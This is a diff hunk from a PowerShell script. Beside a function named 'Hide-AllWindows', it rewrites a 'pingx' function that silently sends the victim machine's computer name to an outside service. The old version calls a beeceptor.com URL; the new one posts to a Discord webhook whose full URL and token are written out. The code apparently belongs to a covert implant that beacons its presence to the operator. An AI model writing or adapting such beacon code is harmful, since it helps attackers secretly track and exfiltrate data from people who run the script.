@@ -108,10 +108,10 @@ function Hide-AllWindows {
 }
 function pingx {
     try {
-         $computerName = $env:COMPUTERNAME
-        $webClient = New-Object System.Net.WebClient
-       
-        $signalBytes = $webClient.DownloadData("https://ig49hsdihfeishkdjhfes.free.beeceptor.com/?msg=$computerName")
+        $compname = $env:COMPUTERNAME
+    $wighiedf = "https://discord.com/api/webhooks/1471198509079466170/5gnWMdqY5uzp3pr1T9Nkv41IXN0i9boy82gbv2uIz9m1J9cXNL4j1M9Q8bV49NNN0bY3"
+    $Body = @{ content = $compname } | ConvertTo-Json
+    Invoke-RestMethod -Uri $wighiedf -Method Post -ContentType "application/json" -Body $Body | Out-Null
         
     } catch {
         
